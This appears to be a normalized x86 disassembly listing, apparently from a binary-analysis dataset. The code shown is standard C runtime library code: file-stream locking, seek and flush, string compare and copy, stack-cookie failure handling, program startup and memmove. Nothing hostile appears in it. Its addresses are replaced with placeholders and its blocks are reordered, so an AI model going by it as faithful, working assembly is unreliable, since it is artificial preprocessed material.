push 0x4
push esi
mov [ rw-data ] esi
call sub_41b887
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_419288
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_41ad36
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4192c7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_41ad36
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_4192f7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_41ae9a
pop ecx
pop ebp
retn
sub_419331
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_41ae9a
pop ecx
pop ebp
retn
sub_41935e
push 0xc
push r--data
call sub_41ecb0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4193e0
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4193d8
mov eax edi
cmp edi 0x1
je r-xdata
call sub_41ecf5
retn
cmp edi 0x2
jne r-xdata
sub_4193e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
push ebx
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push esi
call sub_423e96
mov ebx [ ebp + 0xc ]
add ebx eax
mov eax [ ebp + 0x10 ]
adc eax edx
pop ecx
xor edi edi
jmp r-xdata
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push esi
mov [ ebp + 0x8 ] eax
call sub_41966b
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push edi
push [ ebp + 0x8 ]
push ebx
push esi
call sub_42094c
pop ecx
push eax
call sub_421c67
add esp 0x10
and eax edx
or ecx 0xffffffff
pop ebx
cmp eax ecx
je r-xdata
test al 0x8
je r-xdata
mov eax ecx
jmp r-xdata
xor ecx ecx
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_419491
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
pop ebp
retn
push [ ebp + 0x8 ]
call sub_423e22
mov [ esi ] eax
and eax edx
pop ecx
mov [ esi + 0x4 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_4194e6
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
pop ebp
retn
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41935e
add esp 0x10
pop ebp
retn
sub_41951f
push 0x10
push r--data
call sub_41ecb0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx 0x4
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_41ecf5
retn
mov ecx [ ebp + 0x14 ]
lea eax [ ecx - 0x2 ]
cmp eax 0x7ffffffd
ja r-xdata
cmp ebx 0x40
je r-xdata
cmp ebx 0x40
jne r-xdata
and ecx 0xfffffffe
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x20 ] esi
push esi
call sub_419288
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_41966b
push esi
call sub_422411
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test bl 0x4
je r-xdata
mov ecx [ ebp + 0x14 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
or ecx 0x4
mov [ esi + 0xc ] ecx
lea eax [ esi + 0x14 ]
push 0x2
pop ebx
jmp r-xdata
or ecx 0x500
mov [ esi + 0xc ] ecx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_41b8d1
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] edi
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41961d
mov eax edi
sub_419625
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_41966b
pop ecx
test eax eax
je r-xdata
push esi
call sub_41972d
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_42094c
push eax
call sub_424241
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_41966b
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_42094c
pop ecx
push eax
call sub_421207
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4196d8
push 0xc
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_419625
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419725
mov eax edi
push esi
call sub_41972d
pop ecx
jmp r-xdata
call sub_41ecf5
retn
sub_41972d
push 0x14
push r--data
call sub_41ecb0
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419808
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_41ecf5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4192c7
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4197d5
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_419625
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_419625
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_419811
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push 0x0
add ecx 0x2ac18000
push 0x989680
adc eax 0xfe624e21
push eax
push ecx
call sub_41cf10
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_419860
push 0xc
push r--data
call sub_41ecb0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
xor eax eax
cmp [ ebx ] al
setne al
test eax eax
je r-xdata
call sub_41ecf5
retn
call sub_41f44c
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi ] 0x0
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_424327
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41991c
mov eax edi
call sub_41ccf1
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_41f800
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_419939
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
xor eax eax
pop ebp
retn
sub_419992
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] eax
je r-xdata
push esi
push eax
call sub_4248a3
push [ ebp - 0x4 ]
mov esi eax
call sub_417912
pop ecx
pop ecx
mov eax esi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_4185f2
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
or eax 0xffffffff
leave
retn
sub_4199d2
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4246d6
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_424b75
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_4238a2
mov [ esi + 0x4 ] eax
sub_419a5a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_417912
pop ecx
sub_419a78
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419b0b
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_419b0b
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_4199d2
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0x10 ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_425b2a
movzx edi ax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
lea ebx [ ebx + 0x2 ]
call sub_425b2a
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_419be4
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_41ccf1
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
mov [ ecx ] 0x0
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ebx ] dl
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
mov al [ esi ]
mov [ ebx + esi ] al
inc esi
test al al
je r-xdata
jmp r-xdata
mov al [ esi + ebx ]
mov [ ebx ] al
inc ebx
test al al
je r-xdata
mov [ ecx ] 0x0
call sub_41ccf1
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ ecx + eax - 0x1 ] 0x0
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
sub_419c88
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_41ccf1
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_41ccf1
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
sub_419d46
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_425bdc
push [ ebp + 0x8 ]
call sub_41ca66
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_41ca51
pop ecx
pop ebp
retn
push 0x1
call sub_425bdc
pop ecx
sub_419d83
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_419d46
leave
retn
push 0x2
pop ecx
int 0x29
sub_419e88
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_419d46
leave
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_419f6e
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
call sub_41fc0f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f952
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
mov [ ecx ] bl
mov ecx [ ebp - 0x20 ]
inc ecx
mov [ ebp - 0x20 ] ecx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f952
pop ecx
pop ecx
mov [ ecx ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
sub_41a010
push 0x14
push r--data
call sub_41ecb0
call sub_41c777
movzx esi ax
push 0x2
call sub_4260a9
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_41f2a1
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_424810
test eax eax
jne r-xdata
push 0x1c
call sub_41a160
cmp [ eax + r--data ] ebx
setne bl
call sub_42318a
and [ ebp - 0x4 ] 0x0
call sub_421e0b
test eax eax
jns r-xdata
push 0x10
call sub_41a160
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_426190
mov [ rw-data ] eax
call sub_425d8e
test eax eax
jns r-xdata
push 0x1b
call sub_41a160
call sub_425fc7
test eax eax
jns r-xdata
push 0x8
call sub_4186ea
push 0x1
call sub_418724
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_4186ea
call sub_4261eb
push esi
push eax
push 0x0
push __dos_header
call sub_415ab0
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_4186ea
call sub_418715
jmp r-xdata
push esi
call sub_418980
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_41ecf5
retn
sub_41a1a0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_41a674 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_41a578 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41a674 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41a3ec ]
jmp [ ecx * 4 + jump_table_41a46c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_41a4d8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a674 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41a4d8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
